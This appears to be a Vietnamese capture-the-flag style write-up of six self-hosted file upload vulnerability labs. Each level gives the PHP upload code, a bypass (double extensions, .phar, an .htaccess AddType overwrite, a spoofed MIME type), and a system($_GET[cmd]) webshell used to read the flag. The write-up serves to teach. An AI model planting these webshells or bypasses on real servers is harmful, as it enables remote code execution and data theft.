# File upload vulnerabilities

mình dùng docker để build những bài lap này

![image](https://hackmd.io/_uploads/rJCKcF5W0.png)

![image](https://hackmd.io/_uploads/Hyfw5K9-R.png)

# nhiệm vụ của chúng ta qua các bài lab là RCE và đọc flag

## File upload workshop Level 1

![image](https://hackmd.io/_uploads/HJEJ8X0b0.png)

### Phân tích

- đọc source code mình được

```php
<?php
// error_reporting(0);

// Create folder for each user
session_start();
if (!isset($_SESSION['dir'])) {
    $_SESSION['dir'] = 'upload/' . session_id();
}
$dir = $_SESSION['dir'];
if (!file_exists($dir))
    mkdir($dir);

if (isset($_GET["debug"])) die(highlight_file(__FILE__));
if (isset($_FILES["file"])) {
    $error = '';
    $success = '';
    try {
        $file = $dir . "/" . $_FILES["file"]["name"];
        move_uploaded_file($_FILES["file"]["tmp_name"], $file);
        $success = 'Successfully uploaded file at: <a href="/' . $file . '">/' . $file . ' </a><br>';
        $success .= 'View all uploaded file at: <a href="/' . $dir . '/">/' . $dir . ' </a>';
    } catch (Exception $e) {
        $error = $e->getMessage();
    }
}
?>
```

Đoạn mã PHP này là một phần của một ứng dụng web cho phép người dùng tải lên các tệp lên máy chủ

1. Session Handling (Xử lý phiên):

- Dòng session_start() được sử dụng để bắt đầu hoặc tiếp tục một phiên PHP đã tồn tại.
- Nếu biến $\_SESSION['dir'] không được thiết lập (không tồn tại), nó sẽ tạo một thư mục mới cho người dùng dựa trên ID phiên của họ.
- Biến $dir lưu trữ đường dẫn đến thư mục của người dùng.

2. Tạo thư mục cho người dùng:

- Nếu thư mục của người dùng không tồn tại, nó sẽ được tạo mới bằng hàm mkdir().

3. Debugging (Gỡ lỗi):

- Nếu tham số debug được truyền trong URL mã nguồn của tệp sẽ được hiển thị.
  ![image](https://hackmd.io/_uploads/B1zZPmCZR.png)
  và chúng ta có thể dùng **arjun** để tìm các parameter này nếu như test backbox

4. Xử lý tệp tải lên:

- Khi người dùng gửi một tệp lên thông qua một biểu mẫu, đoạn mã sẽ kiểm tra xem tệp đã được tải lên chưa.
- Nếu tệp đã được tải lên, nó sẽ được di chuyển vào thư mục của người dùng bằng cách sử dụng move_uploaded_file().
- Nếu có lỗi xảy ra trong quá trình này, nó sẽ được bắt và thông báo lỗi sẽ được tạo ra.
- đoạn code không có phần validate loại file có thể tải lên nên chúng ta có thể tải lên bất cứ file nào

5. Hiển thị kết quả:

- Kết quả của việc tải lên sẽ được hiển thị cho người dùng, bao gồm một liên kết đến tệp đã tải lên và một liên kết đến thư mục chứa tất cả các tệp đã tải lên.

mình thử gửi 1 file ảnh bình thường và upload thành công

![image](https://hackmd.io/_uploads/BkuRvQRZA.png)

- và mình có được đường link dẫn đến file này

![image](https://hackmd.io/_uploads/S1Z0vQRZC.png)

![image](https://hackmd.io/_uploads/ByED_QAW0.png)

quan sát trong burp suit mình được

![image](https://hackmd.io/_uploads/ByV_KQCWA.png)

### Khai thác

- khi thấy source code không có cơ chế nào validate file upload lên và mình biết trang web đang chạy là PHP
- nên mình đã thay đổi tên của file upload lên thành anh.php để thực thi webshell PHP và mình chèn thêm đoạn script PHP và giữa file ảnh và vẫn upload file thành công như chúng ta phân tích

![image](https://hackmd.io/_uploads/rJRxqXAWR.png)

- mình vào xem file đã upload và thấy đoạn payload của mình chèn vào đã được trigger

![image](https://hackmd.io/_uploads/BklsKm0bR.png)

- vậy bây giờ chúng ta có thể tạo 1 file để RCE đến hệ thống website như <a href="https://hackmd.io/@monstercuong7/B1WSanCp6">bài này</a> mình đã làm hoặc chúng ta có thể tạo 1 webshell thực thi lệnh trên biến cmd mình tạo trên url như sau

```php
<?php echo 'SECRET============' . system($_GET[cmd]). '============SECRET'; ?>
```

- và mình upload thành công file

![image](https://hackmd.io/_uploads/HJ8G3X0ZA.png)

- mình thực hiện lệnh whoami và được thông tin user web trả về là **www-data**

![image](https://hackmd.io/_uploads/S1sW37R-0.png)

- mình thực hiện lệnh `ls -la /` và thấy được file **secret.txt**

![image](https://hackmd.io/_uploads/SkT6h7CbC.png)

- mình `cat /secret.txt` và được flag

![image](https://hackmd.io/_uploads/H1AlaXRWC.png)

## File upload workshop Level 2

![image](https://hackmd.io/_uploads/rJ2SRQAbR.png)

### Phân tích

- đọc source code mình được:

```php
<?php
// error_reporting(0);

// Create folder for each user
session_start();
if (!isset($_SESSION['dir'])) {
    $_SESSION['dir'] = 'upload/' . session_id();
}
$dir = $_SESSION['dir'];
if (!file_exists($dir))
    mkdir($dir);

if (isset($_GET["debug"])) die(highlight_file(__FILE__));
if (isset($_FILES["file"])) {
    $error = '';
    $success = '';
    try {
        $filename = $_FILES["file"]["name"];
        $extension = explode(".", $filename)[1];
        if ($extension === "php") {
            die("Hack detected");
        }
        $file = $dir . "/" . $filename;
        move_uploaded_file($_FILES["file"]["tmp_name"], $file);
        $success = 'Successfully uploaded file at: <a href="/' . $file . '">/' . $file . ' </a><br>';
        $success .= 'View all uploaded file at: <a href="/' . $dir . '/">/' . $dir . ' </a>';
    } catch (Exception $e) {
        $error = $e->getMessage();
    }
}
?>
```

![image](https://hackmd.io/_uploads/BkPqCm0ZC.png)

- chức năng của bài tương tự với level 1 nhưng có thêm đoạn code phát hiện phần mở rộng của file có là .php hay không nếu có thì sẽ hiện ra **Hack detected** và không cho chúng ta upload
- Nếu tệp tải lên không có phần mở rộng là "php", nó sẽ được di chuyển vào thư mục của người dùng như bình thường.

![image](https://hackmd.io/_uploads/HyBGl4RWR.png)

giống như chúng ta đã phân tích chương trình phát hiện file .php của mình

- nhưng vì explode(".", $filename): Hàm explode() trong PHP chia một chuỗi thành một mảng các phần bằng cách sử dụng một chuỗi phân cách. Trong trường hợp này, nó chia tên tệp $filename thành một mảng, sử dụng dấu chấm (.) làm dấu phân cách
- và nó sẽ chỉ lấy giá trị thứ 2 của mảng và so sánh với chuỗi "php" nên chúng ta có thể lợi dụng nó và đặt tên file thành **anhmoi.anh.php** và lúc này giá trị thứ 2 của mảng là **anh** nó khác với chuỗi php nhưng nó vẫn là file php giúp hệ thống web hiểu và thực thi

### Khai thác

- mình đổi tên file thành **anhmoi.anh.php** và đoạn code đã upload thành công

![image](https://hackmd.io/_uploads/S1_8EE0-R.png)

- vào xem file mình vừa upload và payload của mình đã được trigger

![image](https://hackmd.io/_uploads/HJqdHNAbC.png)

- tiếp theo mình đọc flag với payload

```php
<?php echo 'SECRET============' . system($_GET[cmd]). '============SECRET'; ?>
```

- và mình lấy được flag

![image](https://hackmd.io/_uploads/rkNlUVCZC.png)

## File upload workshop Level 3

![image](https://hackmd.io/_uploads/ByOQLECbA.png)

### Phân tích

- đọc source code mình được:

```php
<?php
// error_reporting(0);

// Create folder for each user
session_start();
if (!isset($_SESSION['dir'])) {
    $_SESSION['dir'] = 'upload/' . session_id();
}
$dir = $_SESSION['dir'];
if (!file_exists($dir))
    mkdir($dir);

if (isset($_GET["debug"])) die(highlight_file(__FILE__));
if (isset($_FILES["file"])) {
    $error = '';
    $success = '';
    try {
        $filename = $_FILES["file"]["name"];
        $extension = end(explode(".", $filename));
        if ($extension === "php") {
            die("Hack detected");
        }
        $file = $dir . "/" . $filename;
        move_uploaded_file($_FILES["file"]["tmp_name"], $file);
        $success = 'Successfully uploaded file at: <a href="/' . $file . '">/' . $file . ' </a><br>';
        $success .= 'View all uploaded file at: <a href="/' . $dir . '/">/' . $dir . ' </a>';
    } catch (Exception $e) {
        $error = $e->getMessage();
    }
}
?>
```

![image](https://hackmd.io/_uploads/BJsKLNRZA.png)

- đoạn code thực hiện chức năng tương tự như level 2 nhưng lần này sẽ lấy giá trị cuối cùng của mảng sau khi phân tách filename chứ không lấy vị trí chỉ định như trước

### Khai thác

- mình lên payloadallthething và thử thay các extension

![image](https://hackmd.io/_uploads/Sy66qNR-0.png)

- và đến **.phar** thì file đã được chạy

![image](https://hackmd.io/_uploads/BkuocVAbR.png)

![image](https://hackmd.io/_uploads/SJ-vi40WR.png)

- tiếp theo mình đọc flag với payload

```php
<?php echo 'SECRET============' . system($_GET[cmd]). '============SECRET'; ?>
```

- và mình lấy được flag

![image](https://hackmd.io/_uploads/BJ5liNAZ0.png)

## File upload workshop Level 4

![image](https://hackmd.io/_uploads/Sk_VhVAWC.png)

### Phân tích

- đọc source code mình được:

```php
<?php
// error_reporting(0);

// Create folder for each user
session_start();
if (!isset($_SESSION['dir'])) {
    $_SESSION['dir'] = 'upload/' . session_id();
}
$dir = $_SESSION['dir'];
if (!file_exists($dir))
    mkdir($dir);

if (isset($_GET["debug"])) die(highlight_file(__FILE__));
if (isset($_FILES["file"])) {
    $error = '';
    $success = '';
    try {
        $filename = $_FILES["file"]["name"];
        $extension = end(explode(".", $filename));
        if (in_array($extension, ["php", "phtml", "phar"])) {
            die("Hack detected");
        }
        $file = $dir . "/" . $filename;
        move_uploaded_file($_FILES["file"]["tmp_name"], $file);
        $success = 'Successfully uploaded file at: <a href="/' . $file . '">/' . $file . ' </a><br>';
        $success .= 'View all uploaded file at: <a href="/' . $dir . '/">/' . $dir . ' </a>';
    } catch (Exception $e) {
        $error = $e->getMessage();
    }
}
?>
```

![image](https://hackmd.io/_uploads/rkUR3V0bC.png)

- đoạn code thực hiện chức năng tương tự như level 3 nhưng lần này sẽ lấy giá trị cuối cùng của mảng sau khi phân tách filename và không được chùng với "php", "phtml", "phar"

- Lưu ý rằng chúng ta có thể tải lên nhiều file ảnh với cùng tên, và khi truy cập tới đường dẫn file upload sẽ hiển thị hình ảnh cuối cùng upload (các hình ảnh đã upload có cùng tên). Như vậy khả năng lớn hệ thống sẽ thay thế ảnh cuối cùng vào vị trí ảnh trước đó có cùng tên. Điều này dẫn đến chúng ta có thể ghi đè nội dung các file đã có.

### Khai thác

- chúng ta có thể ghi đè lên file .htaccess trong server Apache để có thể thực thi mã php nhưng phần mở rổng có thể khác ".php" và mình chọn ở đây là ".cuong"
- mình sẽ ghi đè file .htaccess với nội dung
  `AddType application/x-httpd-php .cuong`

- mình đổi phần Content-Type là `text/plain` và gửi file này

![image](https://hackmd.io/_uploads/BJlaBJHRW0.png)

- Như vậy, hiện tại chúng ta có thể upload các file với phần mở rộng .cuong và có thể thực thi các đoạn code tương đương với một file php.

![image](https://hackmd.io/_uploads/HkpQJSCZA.png)

- giờ mình chỉ cần truy cập vào file mình đã upload và thực thi shell

![image](https://hackmd.io/_uploads/HJN4yHAW0.png)

- tiếp theo mình đọc flag với payload

```php
<?php echo 'SECRET============' . system($_GET[cmd]). '============SECRET'; ?>
```

- và mình lấy được flag

![image](https://hackmd.io/_uploads/r1crlrAZR.png)

## File upload workshop Level 5

![image](https://hackmd.io/_uploads/rJVPxBCWC.png)

### Phân tích

- đọc source code mình được:

```php
<?php
// error_reporting(0);

// Create folder for each user
session_start();
if (!isset($_SESSION['dir'])) {
    $_SESSION['dir'] = 'upload/' . session_id();
}
$dir = $_SESSION['dir'];
if (!file_exists($dir))
    mkdir($dir);

if (isset($_GET["debug"])) die(highlight_file(__FILE__));
if (isset($_FILES["file"])) {
    $error = '';
    $success = '';
    try {
        $mime_type = $_FILES["file"]["type"];
        if (!in_array($mime_type, ["image/jpeg", "image/png", "image/gif"])) {
            die("Hack detected");
        }
        $file = $dir . "/" . $_FILES["file"]["name"];
        move_uploaded_file($_FILES["file"]["tmp_name"], $file);
        $success = 'Successfully uploaded file at: <a href="/' . $file . '">/' . $file . ' </a><br>';
        $success .= 'View all uploaded file at: <a href="/' . $dir . '/">/' . $dir . ' </a>';
    } catch (Exception $e) {
        $error = $e->getMessage();
    }
}
?>
```

![image](https://hackmd.io/_uploads/rkonxBA-A.png)

- đoạn code thực hiện chức năng tương tự như level 4 nhưng lần này sẽ lấy giá trị của phần Content-Type xem có phải "image/jpeg", "image/png", "image/gif"
- nếu có sẽ được lưu file và không thì sẽ không được thực thi

### Khai thác

- tương tự những bài trên mình upload 1 file ảnh bình thường và sửa tên file có phần mở rộng là .php và chương trình này không kiểm tra phần mở rộng của file

![image](https://hackmd.io/_uploads/SytiZH0WC.png)

- như chúng ta phân tích mình đã upload file thành công và file này đã được thực thi

![image](https://hackmd.io/_uploads/HJ-CZH0bC.png)

- tiếp theo mình đọc flag với payload

```php
<?php echo 'SECRET============' . system($_GET[cmd]). '============SECRET'; ?>
```

- và mình lấy được flag

![image](https://hackmd.io/_uploads/SydffBCWR.png)

## File upload workshop Level 6

![image](https://hackmd.io/_uploads/rkEVfrA-0.png)

### Phân tích

- đọc source code mình được:

```php
<?php
// error_reporting(0);

// Create folder for each user
session_start();
if (!isset($_SESSION['dir'])) {
    $_SESSION['dir'] = 'upload/' . session_id();
}
$dir = $_SESSION['dir'];
if (!file_exists($dir))
    mkdir($dir);

if (isset($_GET["debug"])) die(highlight_file(__FILE__));
if (isset($_FILES["file"])) {
    $error = '';
    $success = '';
    try {
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime_type = finfo_file($finfo, $_FILES['file']['tmp_name']);
        $whitelist = array("image/jpeg", "image/png", "image/gif");
        if (!in_array($mime_type, $whitelist, TRUE)) {
            die("Hack detected");
        }
        $file = $dir . "/" . $_FILES["file"]["name"];
        move_uploaded_file($_FILES["file"]["tmp_name"], $file);
        $success = 'Successfully uploaded file at: <a href="/' . $file . '">/' . $file . ' </a><br>';
        $success .= 'View all uploaded file at: <a href="/' . $dir . '/">/' . $dir . ' </a>';
    } catch (Exception $e) {
        $error = $e->getMessage();
    }
}
?>
```

![image](https://hackmd.io/_uploads/B1iufS0Z0.png)

- đoạn code thực hiện chức năng tương tự như level 5 nhưng lần này sẽ có hàm kiểm tra dữ liệu bên trong file chúng ta đã upload `$mime_type = finfo_file($finfo, $_FILES['file']['tmp_name']);`: Hàm finfo_file() sử dụng đối tượng bộ phân tích tệp để xác định loại MIME của tệp được chỉ định.
- sau đó so sánh xem có đúng với dữ liệu trong Content-Type mà chúng ta cung cấp và có trong danh sách whitelist không

### Khai thác

- tương tự những bài trên mình upload 1 file ảnh bình thường và sửa tên file có phần mở rộng là .php và chương trình này không kiểm tra phần mở rộng của file

![image](https://hackmd.io/_uploads/r1mhmSRWA.png)

- như chúng ta phân tích mình đã upload file thành công và file này đã được thực thi

![image](https://hackmd.io/_uploads/BkunmBCWA.png)

- tiếp theo mình đọc flag với payload

```php
<?php echo 'SECRET============' . system($_GET[cmd]). '============SECRET'; ?>
```

- và mình lấy được flag

![image](https://hackmd.io/_uploads/HkYJ4BCZR.png)

<img  src="https://3198551054-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FVvHHLY2mrxd5y4e2vVYL%2Fuploads%2FF8DJirSFlv1Un7WBmtvu%2Fcomplete.gif?alt=media&token=045fd197-4004-49f4-a8ed-ee28e197008f">
